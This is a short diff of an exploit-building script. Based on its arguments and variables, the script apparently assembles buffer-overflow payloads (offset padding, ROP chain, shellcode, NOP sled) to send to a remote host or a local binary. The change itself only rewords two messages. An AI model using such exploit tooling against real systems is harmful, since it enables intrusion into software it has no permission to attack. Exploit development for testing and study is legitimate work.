@@ -86,7 +86,7 @@ if (args.size == -1):
   args.size = ceil( used_size / 100) * 100
 
 if (args.size < used_size):
-  parser.error( f"Increase -s/--size. Can't fit useful payload of size {used_size} into size {args.size}.")
+  parser.error( f"Increase -s/--size. Can't fit payload of size {used_size} into size {args.size}.")
 
 if args.host is not None and args.port is not None:
   if not args.dry:
@@ -97,7 +97,7 @@ else:
     parser.error("Set remote -H/--host and -p/--port and/or local binary -b/--bin.")
 
 log.info(f"Shellcode size {len(shellcode)}")
-log.info(f"Useful size (offset + ROP + shellcode + suffix) {used_size}")
+log.info(f"Used size (offset + ROP + shellcode + suffix) {used_size}")
 
 padding = b"\x90" * (args.offset - len(args.prefix))
 nopsled = b"\x90" * (args.size - used_size)
